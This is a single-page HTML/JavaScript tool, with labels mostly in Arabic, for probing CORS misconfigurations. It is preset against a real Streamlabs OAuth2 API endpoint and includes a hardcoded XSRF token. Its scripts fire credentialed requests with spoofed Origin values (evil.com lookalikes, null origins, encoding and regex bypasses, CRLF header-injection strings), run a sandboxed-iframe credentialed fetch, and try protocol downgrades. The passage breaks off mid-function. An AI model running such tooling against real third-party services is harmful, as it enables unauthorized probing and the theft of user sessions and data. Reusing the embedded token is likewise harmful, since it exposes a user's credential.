<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced CORS Vulnerability Testing Tool</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Consolas', 'Monaco', monospace;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
            color: #00ff00;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1600px;
            margin: 0 auto;
            background: rgba(20, 20, 20, 0.95);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 0 40px rgba(0, 255, 0, 0.3);
            border: 2px solid #00ff00;
        }
        
        h1 {
            text-align: center;
            color: #00ff00;
            text-shadow: 0 0 20px #00ff00;
            margin-bottom: 30px;
            font-size: 2.5em;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { text-shadow: 0 0 20px #00ff00; }
            50% { text-shadow: 0 0 40px #00ff00, 0 0 60px #00ff00; }
            100% { text-shadow: 0 0 20px #00ff00; }
        }
        
        .section {
            background: rgba(10, 10, 10, 0.8);
            padding: 20px;
            margin: 20px 0;
            border-radius: 10px;
            border: 1px solid #00ff00;
        }
        
        .section h2 {
            color: #00ff00;
            margin-bottom: 15px;
            font-size: 1.5em;
        }
        
        input, textarea, select {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            background: #000;
            color: #00ff00;
            border: 1px solid #00ff00;
            border-radius: 5px;
            font-family: inherit;
            font-size: 14px;
        }
        
        input:focus, textarea:focus, select:focus {
            outline: none;
            box-shadow: 0 0 10px #00ff00;
        }
        
        .button-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 10px;
            margin: 20px 0;
        }
        
        button {
            background: linear-gradient(45deg, #00ff00, #00cc00);
            color: #000;
            border: none;
            padding: 12px 20px;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            font-size: 14px;
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(0, 255, 0, 0.5);
        }
        
        button:active {
            transform: translateY(0);
        }
        
        .results {
            background: #000;
            padding: 20px;
            border-radius: 10px;
            border: 1px solid #00ff00;
            max-height: 600px;
            overflow-y: auto;
            font-size: 13px;
            line-height: 1.6;
        }
        
        .results::-webkit-scrollbar {
            width: 10px;
        }
        
        .results::-webkit-scrollbar-track {
            background: #111;
        }
        
        .results::-webkit-scrollbar-thumb {
            background: #00ff00;
            border-radius: 5px;
        }
        
        .log-entry {
            margin: 5px 0;
            padding: 8px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
        }
        
        .success { 
            color: #00ff00; 
            background: rgba(0, 255, 0, 0.1);
        }
        
        .error { 
            color: #ff0000; 
            background: rgba(255, 0, 0, 0.1);
        }
        
        .warning { 
            color: #ffff00; 
            background: rgba(255, 255, 0, 0.1);
        }
        
        .info { 
            color: #00ffff; 
            background: rgba(0, 255, 255, 0.1);
        }
        
        .vulnerable { 
            color: #ff00ff; 
            background: rgba(255, 0, 255, 0.1);
            font-weight: bold;
            font-size: 16px;
            animation: blink 1s infinite;
        }
        
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0.5; }
        }
        
        pre {
            background: #000;
            padding: 10px;
            border-radius: 5px;
            overflow-x: auto;
            margin: 5px 0;
            border: 1px solid #333;
        }
        
        .progress-bar {
            width: 100%;
            height: 20px;
            background: #111;
            border-radius: 10px;
            overflow: hidden;
            margin: 10px 0;
            border: 1px solid #00ff00;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #00ff00, #00cc00);
            width: 0%;
            transition: width 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #000;
            font-weight: bold;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 10px;
            margin: 20px 0;
        }
        
        .stat-card {
            background: rgba(0, 255, 0, 0.1);
            padding: 15px;
            border-radius: 5px;
            text-align: center;
            border: 1px solid #00ff00;
        }
        
        .stat-value {
            font-size: 2em;
            font-weight: bold;
            color: #00ff00;
        }
        
        .stat-label {
            font-size: 0.9em;
            color: #00cc00;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🛡️ Advanced CORS Vulnerability Testing Tool 🛡️</h1>
        
        <div class="section">
            <h2>⚙️ إعدادات الهدف</h2>
            <label>Target URL:</label>
            <input type="text" id="targetUrl" value="https://api-id.streamlabs.com/v1/identity/clients/412568508887465984/oauth2" />
            
            <label>HTTP Method:</label>
            <select id="method">
                <option value="POST">POST</option>
                <option value="GET">GET</option>
                <option value="PUT">PUT</option>
                <option value="DELETE">DELETE</option>
                <option value="PATCH">PATCH</option>
                <option value="OPTIONS">OPTIONS</option>
                <option value="HEAD">HEAD</option>
            </select>
            
            <label>Request Body (JSON):</label>
            <textarea id="requestBody" rows="4">{"origin":"https://videoeditor.streamlabs.com","intent":"connect","noAuthTarget":"login"}</textarea>
            
            <label>Custom Headers (JSON):</label>
            <textarea id="customHeaders" rows="8">{
  "X-Xsrf-Token": "eyJpdiI6IjE4K0tMZGZ4UHV0aWdsaVJXMC9RRGc9PSIsInZhbHVlIjoiWmoxcEc4OVM0WDBlcGR2VmhVVFFBZG5KUTdIUy8zS0xGcVpkYW1DYWNTdkZtelRESU9hSmNGU2FXbTBSY1UxNCIsIm1hYyI6IjNkNjM4ZjViZTU2MGEzNGE4NjJjZjUyYzhkY2RmNjM3ODBlNzc3OTZlMDMwZTQwZmY2NGYxMGFmNzZmYTM1ZDciLCJ0YWciOiIifQ==",
  "Content-Type": "application/json",
  "Accept": "application/json, text/plain, */*"
}</textarea>
            
            <label>Test Delay (ms):</label>
            <input type="number" id="delay" value="100" min="0" max="5000" />
        </div>

        <div class="section">
            <h2>🎯 اختبارات CORS المتقدمة</h2>
            <div class="button-grid">
                <button onclick="runAllTests()">🚀 تشغيل جميع الاختبارات</button>
                <button onclick="testBasicCORS()">📋 اختبار CORS الأساسي</button>
                <button onclick="testOriginManipulation()">🌐 تلاعب Origin</button>
                <button onclick="testSubdomainAttacks()">🔗 هجمات Subdomain</button>
                <button onclick="testNullOrigin()">🚫 Null Origin</button>
                <button onclick="testCredentialsInclude()">🔐 Credentials Testing</button>
                <button onclick="testPreflightBypass()">✈️ Preflight Bypass</button>
                <button onclick="testHeaderInjection()">💉 Header Injection</button>
                <button onclick="testProtocolDowngrade()">🔓 Protocol Downgrade</button>
                <button onclick="testWildcardBypass()">🃏 Wildcard Bypass</button>
                <button onclick="testWebSocketCORS()">🔌 WebSocket CORS</button>
                <button onclick="testSpecialCharacters()">🔤 Special Characters</button>
                <button onclick="testRegexBypass()">🎭 Regex Bypass</button>
                <button onclick="testPortVariations()">🔢 Port Variations</button>
                <button onclick="testEncodingBypass()">🔐 Encoding Bypass</button>
                <button onclick="testChainedAttacks()">⛓️ Chained Attacks</button>
                <button onclick="clearResults()">🗑️ مسح النتائج</button>
                <button onclick="exportResults()">📥 تصدير النتائج</button>
            </div>
        </div>

        <div class="stats">
            <div class="stat-card">
                <div class="stat-value" id="totalTests">0</div>
                <div class="stat-label">إجمالي الاختبارات</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="vulnerableCount">0</div>
                <div class="stat-label">ثغرات مكتشفة</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="successCount">0</div>
                <div class="stat-label">نجح</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="failedCount">0</div>
                <div class="stat-label">فشل</div>
            </div>
        </div>

        <div class="progress-bar">
            <div class="progress-fill" id="progressBar">0%</div>
        </div>

        <div class="results" id="results">
            <div class="log-entry info">🚀 جاهز لبدء اختبار ثغرات CORS...</div>
        </div>
    </div>

    <script>
        let testResults = [];
        let stats = {
            total: 0,
            vulnerable: 0,
            success: 0,
            failed: 0
        };
        
        function updateStats() {
            document.getElementById('totalTests').textContent = stats.total;
            document.getElementById('vulnerableCount').textContent = stats.vulnerable;
            document.getElementById('successCount').textContent = stats.success;
            document.getElementById('failedCount').textContent = stats.failed;
        }
        
        function updateProgress(current, total) {
            const percentage = total > 0 ? Math.round((current / total) * 100) : 0;
            const progressBar = document.getElementById('progressBar');
            progressBar.style.width = percentage + '%';
            progressBar.textContent = percentage + '%';
        }
        
        function log(message, type = 'info', details = null) {
            const timestamp = new Date().toLocaleTimeString();
            const results = document.getElementById('results');
            
            const entry = document.createElement('div');
            entry.className = `log-entry ${type}`;
            entry.innerHTML = `[${timestamp}] ${message}`;
            
            if (details) {
                const pre = document.createElement('pre');
                pre.textContent = typeof details === 'string' ? details : JSON.stringify(details, null, 2);
                entry.appendChild(pre);
            }
            
            results.appendChild(entry);
            results.scrollTop = results.scrollHeight;
            
            testResults.push({ timestamp, message, type, details });
            
            if (type === 'vulnerable') stats.vulnerable++;
            else if (type === 'success') stats.success++;
            else if (type === 'error') stats.failed++;
            
            updateStats();
        }
        
        function clearResults() {
            document.getElementById('results').innerHTML = '<div class="log-entry info">🚀 جاهز لبدء اختبار ثغرات CORS...</div>';
            testResults = [];
            stats = { total: 0, vulnerable: 0, success: 0, failed: 0 };
            updateStats();
            updateProgress(0, 0);
        }
        
        function exportResults() {
            const data = {
                timestamp: new Date().toISOString(),
                targetUrl: document.getElementById('targetUrl').value,
                stats: stats,
                results: testResults
            };
            
            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `cors-test-results-${Date.now()}.json`;
            a.click();
            URL.revokeObjectURL(url);
        }
        
        async function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        async function makeRequest(url, options = {}) {
            const delayMs = parseInt(document.getElementById('delay').value) || 100;
            await delay(delayMs);
            
            try {
                const response = await fetch(url, options);
                const responseData = {
                    status: response.status,
                    statusText: response.statusText,
                    headers: {}
                };
                
                // جمع headers الاستجابة
                const importantHeaders = [
                    'access-control-allow-origin',
                    'access-control-allow-credentials',
                    'access-control-allow-methods',
                    'access-control-allow-headers',
                    'access-control-expose-headers',
                    'access-control-max-age',
                    'vary',
                    'x-frame-options',
                    'content-security-policy',
                    'x-content-type-options'
                ];
                
                for (let header of importantHeaders) {
                    const value = response.headers.get(header);
                    if (value) responseData.headers[header] = value;
                }
                
                // محاولة قراءة الجسم
                try {
                    const contentType = response.headers.get('content-type');
                    if (contentType && contentType.includes('application/json')) {
                        responseData.body = await response.json();
                    } else {
                        responseData.body = await response.text();
                    }
                } catch (e) {
                    responseData.body = 'Could not read response body';
                }
                
                return { success: true, response: responseData };
            } catch (error) {
                return { success: false, error: error.message };
            }
        }
        
        async function testBasicCORS() {
            log('🔍 بدء اختبار CORS الأساسي...', 'info');
            stats.total++;
            
            const url = document.getElementById('targetUrl').value;
            const method = document.getElementById('method').value;
            const body = document.getElementById('requestBody').value;
            const headers = JSON.parse(document.getElementById('customHeaders').value || '{}');
            
            const options = {
                method: method,
                headers: headers,
                mode: 'cors',
                credentials: 'include'
            };
            
            if (method !== 'GET' && method !== 'HEAD') {
                options.body = body;
            }
            
            const result = await makeRequest(url, options);
            
            if (result.success) {
                const corsHeaders = result.response.headers;
                log('✅ الاتصال نجح', 'success', corsHeaders);
                
                // تحليل الثغرات
                if (corsHeaders['access-control-allow-origin'] === '*') {
                    log('🚨 ثغرة CORS خطيرة: الخادم يقبل أي origin (*)', 'vulnerable');
                }
                
                if (corsHeaders['access-control-allow-credentials'] === 'true') {
                    if (corsHeaders['access-control-allow-origin'] === '*') {
                        log('🚨 ثغرة CORS حرجة: wildcard مع credentials!', 'vulnerable');
                    } else {
                        log('⚠️ الخادم يسمح بإرسال credentials', 'warning');
                    }
                }
            } else {
                log(`❌ فشل الاتصال: ${result.error}`, 'error');
            }
        }
        
        async function testOriginManipulation() {
            log('🌐 بدء اختبار التلاعب بـ Origin...', 'info');
            
            const url = document.getElementById('targetUrl').value;
            const method = document.getElementById('method').value;
            const body = document.getElementById('requestBody').value;
            const baseHeaders = JSON.parse(document.getElementById('customHeaders').value || '{}');
            
            const maliciousOrigins = [
                'https://evil.com',
                'http://evil.com',
                'https://evil-streamlabs.com',
                'https://streamlabs.evil.com',
                'https://streamlabs.com.evil.com',
                'https://streamlabsXcom',
                'https://streamlabs.com@evil.com',
                'https://evil.com#@streamlabs.com',
                'https://streamlabs.com%60.evil.com',
                'https://streamlabs.com\\.evil.com',
                'https://streamlabs.com*.evil.com',
                'https://streamlabs.com!.evil.com',
                'https://streamlabs.com$.evil.com',
                'https://streamlabs.com&.evil.com',
                'https://streamlabs.com\'.evil.com',
                'https://streamlabs.com+.evil.com',
                'https://streamlabs.com,.evil.com',
                'https://streamlabs.com;.evil.com',
                'https://streamlabs.com=.evil.com',
                'https://streamlabs.com%00.evil.com',
                'https://streamlabs.com%0d%0a.evil.com',
                'https://streamlabs.com%20.evil.com',
                'https://streamlabs.com%2e.evil.com',
                'http://localhost',
                'http://127.0.0.1',
                'http://0.0.0.0',
                'http://[::1]',
                'file:///',
                'null',
                'undefined',
                'chrome-extension://evil',
                'moz-extension://evil'
            ];
            
            const total = maliciousOrigins.length;
            let current = 0;
            
            for (const origin of maliciousOrigins) {
                current++;
                updateProgress(current, total);
                stats.total++;
                
                const headers = { ...baseHeaders, 'Origin': origin };
                const options = {
                    method: method,
                    headers: headers,
                    mode: 'cors',
                    credentials: 'include'
                };
                
                if (method !== 'GET' && method !== 'HEAD') {
                    options.body = body;
                }
                
                const result = await makeRequest(url, options);
                
                if (result.success) {
                    const allowOrigin = result.response.headers['access-control-allow-origin'];
                    const allowCredentials = result.response.headers['access-control-allow-credentials'];
                    
                    if (allowOrigin === origin || allowOrigin === '*') {
                        log(`🚨 ثغرة CORS: الخادم يقبل Origin الخبيث: ${origin}`, 'vulnerable', {
                            'sent-origin': origin,
                            'allowed-origin': allowOrigin,
                            'allow-credentials': allowCredentials,
                            'response-status': result.response.status
                        });
                    } else if (allowOrigin) {
                        log(`✅ آمن: الخادم رفض Origin: ${origin}`, 'success');
                    }
                }
            }
        }
        
        async function testSubdomainAttacks() {
            log('🔗 بدء اختبار هجمات Subdomain...', 'info');
            
            const url = document.getElementById('targetUrl').value;
            const baseHeaders = JSON.parse(document.getElementById('customHeaders').value || '{}');
            
            // استخراج الدومين الأساسي
            const urlObj = new URL(url);
            const domain = urlObj.hostname.split('.').slice(-2).join('.');
            
            const subdomainVariations = [
                `https://evil.${domain}`,
                `https://evil-${domain}`,
                `https://${domain}.evil.com`,
                `https://sub.${domain}`,
                `https://test.${domain}`,
                `https://dev.${domain}`,
                `https://staging.${domain}`,
                `https://api.${domain}`,
                `https://admin.${domain}`,
                `https://www.${domain}`,
                `https://mobile.${domain}`,
                `https://app.${domain}`,
                `https://*.${domain}`,
                `https://?.${domain}`,
                `https://_.${domain}`,
                `https://-.${domain}`,
                `https://a.b.${domain}`,
                `https://very.long.subdomain.chain.${domain}`
            ];
            
            for (const origin of subdomainVariations) {
                stats.total++;
                const headers = { ...baseHeaders, 'Origin': origin };
                const options = {
                    method: document.getElementById('method').value,
                    headers: headers,
                    mode: 'cors',
                    credentials: 'include'
                };
                
                if (options.method !== 'GET' && options.method !== 'HEAD') {
                    options.body = document.getElementById('requestBody').value;
                }
                
                const result = await makeRequest(url, options);
                
                if (result.success) {
                    const allowOrigin = result.response.headers['access-control-allow-origin'];
                    if (allowOrigin === origin || allowOrigin === '*') {
                        log(`🚨 ثغرة Subdomain: ${origin} مسموح!`, 'vulnerable', result.response.headers);
                    }
                }
            }
        }
        
        async function testNullOrigin() {
            log('🚫 بدء اختبار Null Origin...', 'info');
            stats.total++;
            
            const url = document.getElementById('targetUrl').value;
            const baseHeaders = JSON.parse(document.getElementById('customHeaders').value || '{}');
            
            // طرق مختلفة لإرسال null origin
            const nullOriginTests = [
                { origin: 'null', description: 'Direct null string' },
                { origin: null, description: 'JavaScript null value' },
                { origin: '', description: 'Empty string' },
                { origin: ' ', description: 'Space character' },
                { origin: '\x00', description: 'Null byte' },
                { origin: 'data:', description: 'Data URI' },
                { origin: 'blob:', description: 'Blob URI' },
                { origin: 'file:', description: 'File protocol' }
            ];
            
            for (const test of nullOriginTests) {
                const headers = { ...baseHeaders };
                if (test.origin !== null) {
                    headers['Origin'] = test.origin;
                }
                
                const options = {
                    method: document.getElementById('method').value,
                    headers: headers,
                    mode: 'cors',
                    credentials: 'include'
                };
                
                if (options.method !== 'GET' && options.method !== 'HEAD') {
                    options.body = document.getElementById('requestBody').value;
                }
                
                const result = await makeRequest(url, options);
                
                if (result.success) {
                    const allowOrigin = result.response.headers['access-control-allow-origin'];
                    if (allowOrigin === 'null' || allowOrigin === test.origin || allowOrigin === '*') {
                        log(`🚨 ثغرة Null Origin: ${test.description}`, 'vulnerable', {
                            'test': test,
                            'response-headers': result.response.headers
                        });
                    }
                }
            }
            
            // اختبار iframe sandboxed
            log('🔍 اختبار Sandboxed iframe null origin...', 'info');
            const iframe = document.createElement('iframe');
            iframe.sandbox = 'allow-scripts';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            
            iframe.contentDocument.write(\`
                <script>
                    fetch('${url}', {
                        method: '${document.getElementById('method').value}',
                        headers: ${JSON.stringify(baseHeaders)},
                        credentials: 'include'
                    }).then(r => r.text()).then(data => {
                        parent.postMessage({
                            type: 'cors-test',
                            success: true,
                            data: data
                        }, '*');
                    }).catch(err => {
                        parent.postMessage({
                            type: 'cors-test',
                            success: false,
                            error: err.message
                        }, '*');
                    });
                <\/script>
            \`);
            
            window.addEventListener('message', function(e) {
                if (e.data.type === 'cors-test') {
                    if (e.data.success) {
                        log('🚨 ثغرة: Sandboxed iframe يمكنه الوصول!', 'vulnerable', e.data);
                    }
                    document.body.removeChild(iframe);
                }
            });
        }
        
        async function testCredentialsInclude() {
            log('🔐 بدء اختبار Credentials...', 'info');
            
            const url = document.getElementById('targetUrl').value;
            const baseHeaders = JSON.parse(document.getElementById('customHeaders').value || '{}');
            
            const credentialTests = [
                { credentials: 'include', origin: 'https://evil.com' },
                { credentials: 'same-origin', origin: 'https://evil.com' },
                { credentials: 'omit', origin: 'https://evil.com' },
                { credentials: 'include', origin: '*' },
                { credentials: 'include', origin: 'null' }
            ];
            
            for (const test of credentialTests) {
                stats.total++;
                const headers = { ...baseHeaders, 'Origin': test.origin };
                const options = {
                    method: document.getElementById('method').value,
                    headers: headers,
                    mode: 'cors',
                    credentials: test.credentials
                };
                
                if (options.method !== 'GET' && options.method !== 'HEAD') {
                    options.body = document.getElementById('requestBody').value;
                }
                
                const result = await makeRequest(url, options);
                
                if (result.success) {
                    const allowOrigin = result.response.headers['access-control-allow-origin'];
                    const allowCredentials = result.response.headers['access-control-allow-credentials'];
                    
                    if (allowCredentials === 'true' && (allowOrigin === test.origin || allowOrigin === '*')) {
                        log(`🚨 ثغرة Credentials: ${JSON.stringify(test)}`, 'vulnerable', result.response.headers);
                    }
                }
            }
        }
        
        async function testPreflightBypass() {
            log('✈️ بدء اختبار تجاوز Preflight...', 'info');
            
            const url = document.getElementById('targetUrl').value;
            
            // اختبار الطلبات البسيطة التي لا تحتاج preflight
            const simpleRequests = [
                {
                    method: 'GET',
                    headers: { 'Origin': 'https://evil.com' }
                },
                {
                    method: 'POST',
                    headers: {
                        'Origin': 'https://evil.com',
                        'Content-Type': 'text/plain'
                    }
                },
                {
                    method: 'POST',
                    headers: {
                        'Origin': 'https://evil.com',
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }
                },
                {
                    method: 'POST',
                    headers: {
                        'Origin': 'https://evil.com',
                        'Content-Type': 'multipart/form-data'
                    }
                }
            ];
            
            for (const request of simpleRequests) {
                stats.total++;
                const options = {
                    method: request.method,
                    headers: request.headers,
                    mode: 'cors',
                    credentials: 'include'
                };
                
                if (request.method === 'POST') {
                    options.body = 'test=data';
                }
                
                const result = await makeRequest(url, options);
                
                if (result.success) {
                    log(`⚠️ طلب بسيط بدون preflight: ${JSON.stringify(request)}`, 'warning', result.response.headers);
                }
            }
        }
        
        async function testHeaderInjection() {
            log('💉 بدء اختبار Header Injection...', 'info');
            
            const url = document.getElementById('targetUrl').value;
            const baseHeaders = JSON.parse(document.getElementById('customHeaders').value || '{}');
            
            const injectionTests = [
                'https://evil.com\r\nX-Injected: true',
                'https://evil.com\nX-Injected: true',
                'https://evil.com\r\n\r\nGET /admin HTTP/1.1\r\nHost: evil.com',
                'https://evil.com%0d%0aX-Injected:%20true',
                'https://evil.com%0aX-Injected:%20true',
                'https://evil.com\u000dX-Injected: true',
                'https://evil.com\u000aX-Injected: true',
                'https://evil.com\u0085X-Injected: true',
                'https://evil.com\u2028X-Injected: true',
                'https://evil.com\u2029X-Injected: true'
            ];
            
            for (const injection of injectionTests) {
                stats.total++;
                const headers = { ...baseHeaders, 'Origin': injection };
                
                try {
                    const options = {
                        method: document.getElementById('method').value,
                        headers: headers,
                        mode: 'cors',
                        credentials: 'include'
                    };
                    
                    if (options.method !== 'GET' && options.method !== 'HEAD') {
                        options.body = document.getElementById('requestBody').value;
                    }
                    
                    const result = await makeRequest(url, options);
                    
                    if (result.success) {
                        log(`⚠️ Header injection محتمل: ${injection}`, 'warning', result.response.headers);
                    }
                } catch (e) {
                    log(`✅ Header injection محمي: ${injection}`, 'success');
                }
            }
        }
        
        async function testProtocolDowngrade() {
            log('🔓 بدء اختبار Protocol Downgrade...', 'info');
            
            const url = document.getElementById('targetUrl').value;
            const urlObj = new URL(url);
            
            const protocols = [
                `http://${urlObj.host}${urlObj.pathname}`,
                `ws://${urlObj.host}${urlObj.pathname}`,
                `wss://${urlObj.host}${urlObj.pathname}`,
                `ftp://${urlObj.host}${urlObj.pathname}`
            ];
            
            for (const protocolUrl of protocols) {
                stats.total++;
                try {
                    const result = await makeRequest(protocolUrl, {
                        method: document.getElementById('method').value,
                        headers: JSON.parse(document.getElementById('customHeaders').value || '{}'),
                        mode: 'cors',
                        credentials: 'include'
                    });
                    
                    if (result.success) {
                        log(`🚨 Protocol downgrade ممكن: ${protocolUrl}`, 'vulnerable', result.response.headers);
                    }
                } catch (e) {
                    log(`✅ Protocol downgrade محمي: ${protocolUrl}`, 'info');
                }
            }
        }
        
        async function testWildcardBypass() {
            log('🃏 بدء اختبار Wildcard Bypass...', 'info');
            
            const url = document.getElementById('targetUrl').value;
            const baseHeaders = JSON.parse(document.getElementById('customHeaders').value || '{}');
            
            const wildcardTests = [
                { origin: '*', desc: 'Direct wildcard' },
                { origin: '*.evil.com', desc: 'Wildcard subdomain' },
                { origin: 'https://*', desc: 'Wildcard with protocol' },
                { origin: '*://evil.com', desc: 'Wildcard protocol' },
                { origin: 'https://?.evil.com', desc: 'Question mark wildcard' },
                { origin: 'https://%.evil.com', desc: 'Percent wildcard' },
                { origin: 'https://_.evil.com', desc: 'Underscore wildcard' }
            ];
            
            for (const test of wildcardTests) {
                stats.total++;
                const headers = { ...baseHeaders, 'Origin': test.origin };
                const options = {
                    method: document.getElementById('method').value,
                    headers: headers,
                    mode: 'cors',
                    credentials: 'include'
                };
                
                if (options.method !== 'GET' && options.method !== 'HEAD') {
                    options.body = document.getElementById('requestBody').value;
                }
                
                const result = await makeRequest(url, options);
                
                if (result.success) {
                    const allowOrigin = result.response.headers['access-control-allow-origin'];
                    if (allowOrigin && (allowOrigin.includes('*') || allowOrigin === test.origin)) {
                        log(`🚨 Wildcard bypass: ${test.desc}`, 'vulnerable', {
                            'test': test,
                            'response': result.response.headers
                        });
                    }
                }
            }
        }
        
        async function testWebSocketCORS() {
            log('🔌 بدء اختبار WebSocket CORS...', 'info');
            stats.total++;
            
            const url = document.getElementById('targetUrl').value;
            const wsUrl = url.replace('https://', 'wss://').replace('http://', 'ws://');
            
            try {
                const ws = new WebSocket(wsUrl);
                
                ws.onopen = () => {
                    log('🚨 WebSocket connection opened - قد تكون هناك ثغرة CORS!', 'vulnerable');
                    ws.send(JSON.stringify({
                        type: 'test',
                        payload: 'CORS test'
                    }));
                };
                
                ws.onmessage = (event) => {
                    log('📨 WebSocket message received', 'warning', event.data);
                };
                
                ws.onerror = (error) => {
                    log('✅ WebSocket connection blocked', 'success');
                };
                
                setTimeout(() => {
                    if (ws.readyState === WebSocket.OPEN) {
                        ws.close();
                    }
                }, 5000);
                
            } catch (e) {
                log('✅ WebSocket connection failed - محمي', 'success');
            }
        }
        
        async function testSpecialCharacters() {
            log('🔤 بدء اختبار Special Characters...', 'info');
            
            const url = document.getElementById('targetUrl').value;
            const urlObj = new URL(url);
            const domain = urlObj.hostname;
            
            const specialChars = [
                `https://${domain}｡evil.com`,
                `https://${domain}。evil.com`,
                `https://${domain}．evil.com`,
                `https://${domain}｀evil.com`,
                `https://${domain}ʳevil.com`,
                `https://${domain}ªevil.com`,
                `https://${domain}ºevil.com`,
                `https://${domain}˚evil.com`,
                `https://${domain}⁰evil.com`,
                `https://${domain}₀evil.com`,
                `https://${domain}\u3002evil.com`,
                `https://${domain}\uff0eevil.com`,
                `https://${domain}\uff61evil.com`,
                `https://${domain}%E3%80%82evil.com`,
                `https://${domain}。evil.com`,
                `https://${domain}｡evil.com`,
                `https://${domain}。evil。com`,
                `https://${domain}\u2024evil.com`,
                `https://${domain}\u2025evil.com`,
                `https://${domain}\u2026evil.com`
            ];
            
            for (const origin of specialChars) {
                stats.total++;
                const result = await makeRequest(url, {
                    method: document.getElementById('method').value,
                    headers: {
                        ...JSON.parse(document.getElementById('customHeaders').value || '{}'),
                        'Origin': origin
                    },
                    mode: 'cors',
                    credentials: 'include'
                });
                
                if (result.success) {
                    const allowOrigin = result.response.headers['access-control-allow-origin'];
                    if (allowOrigin === origin || allowOrigin === '*') {
                        log(`🚨 Special character bypass: ${origin}`, 'vulnerable', result.response.headers);
                    }
                }
            }
        }
        
        async function testRegexBypass() {
            log('🎭 بدء اختبار Regex Bypass...', 'info');
            
            const url = document.getElementById('targetUrl').value;
            const urlObj = new URL(url);
            const domain = urlObj.hostname;
            
            const regexBypass = [
                `https://${domain}.evil.com`,
                `https://${domain}evil.com`,
                `https://evil${domain}`,
                `https://${domain.replace('.', 'evil.')}`,
                `https://${domain}?evil.com`,
                `https://${domain}#evil.com`,
                `https://${domain};evil.com`,
                `https://${domain}:evil.com@evil.com`,
                `https://${domain}%2eevil.com`,
                `https://${domain}%2Eevil.com`,
                `https://${domain}\\.evil.com`,
                `https://${domain}[.]evil.com`,
                `https://${domain}(.)evil.com`,
                `https://${domain}{.}evil.com`,
                `https://${domain}|evil.com`,
                `https://${domain}$evil.com`,
                `https://${domain}^evil.com`,
                `https://${domain}+evil.com`,
                `https://${domain}=evil.com`,
                `https://${domain}!evil.com`
            ];
            
            for (const origin of regexBypass) {
                stats.total++;
                const result = await makeRequest(url, {
                    method: document.getElementById('method').value,
                    headers: {
                        ...JSON.parse(document.getElementById('customHeaders').value || '{}'),
                        'Origin': origin
                    },
                    mode: 'cors',
                    credentials: 'include'
                });
                
                if (result.success) {
                    const allowOrigin = result.response.headers['access-control-allow-origin'];
                    if (allowOrigin === origin || allowOrigin === '*') {
                        log(`🚨 Regex bypass: ${origin}`, 'vulnerable', result.response.headers);
                    }
                }
            }
        }
        
        async function testPortVariations() {
            log('🔢 بدء اختبار Port Variations...', 'info');
            
            const url = document.getElementById('targetUrl').value;
            const urlObj = new URL(url);
            
            const ports = [
                ':80', ':443', ':8080', ':8443', ':3000', ':4000', ':5000',
                ':8000', ':8888', ':9090', ':0', ':65535', ':-1', ':99999'
            ];
            
            for (const port of ports) {
                stats.total++;
                const origin = `${urlObj.protocol}//${urlObj.hostname}${port}`;
                
                const result = await makeRequest(url, {
                    method: document.getElementById('method').value,
                    headers: {
                        ...JSON.parse(document.getElementById('customHeaders').value || '{}'),
                        'Origin': origin
                    },
                    mode: 'cors',
                    credentials: 'include'
                });
                
                if (result.success) {
                    const allowOrigin = result.response.headers['access-control-allow-origin'];
                    if (allowOrigin === origin || allowOrigin === '*') {
                        log(`🚨 Port variation bypass: ${origin}`, 'vulnerable', result.response.headers);
                    }
                }
            }
        }
        
        async function testEncodingBypass() {
            log('🔐 بدء اختبار Encoding Bypass...', 'info');
            
            const url = document.getElementById('targetUrl').value;
            const urlObj = new URL(url);
            const domain = urlObj.hostname;
            
            const encodings = [
                // URL encoding
                `https://${encodeURIComponent(domain)}.evil.com`,
                `https://${domain}%2eevil%2ecom`,
                
                // Double encoding
                `https://${domain}%252eevil%252ecom`,
                
                // Unicode encoding
                `https://${domain}\u002eevil\u002ecom`,
                
                // HTML encoding
                `https://${domain}&#46;evil&#46;com`,
                
                // Mixed encoding
                `https://${domain}%2e\u0065vil.com`,
                
                // Punycode
                `https://xn--${domain}-evil.com`,
                
                // Base64 (if processed)
                btoa(`https://${domain}.evil.com`)
            ];
            
            for (const origin of encodings) {
                stats.total++;
                const result = await makeRequest(url, {
                    method: document.getElementById('method').value,
                    headers: {
                        ...JSON.parse(document.getElementById('customHeaders').value || '{}'),
                        'Origin': origin
                    },
                    mode: 'cors',
                    credentials: 'include'
                });
                
                if (result.success) {
                    const allowOrigin = result.response.headers['access-control-allow-origin'];
                    if (allowOrigin === origin || allowOrigin === '*') {
                        log(`🚨 Encoding bypass: ${origin}`, 'vulnerable', result.response.headers);
                    }
                }
            }
        }
        
        async function testChainedAttacks() {
            log('⛓️ بدء اختبار Chained Attacks...', 'info');
            
            const url = document.getElementById('targetUrl').value;
            
            // سلسلة من الهجمات المعقدة
            const chainedTests = [
                {
                    name: 'CORS + XSS Chain',
                    origin: 'https://evil.com',
                    body: JSON.stringify({
                        origin: 'https://videoeditor.streamlabs.com',
                        intent: 'connect',
                        noAuthTarget: 'login',
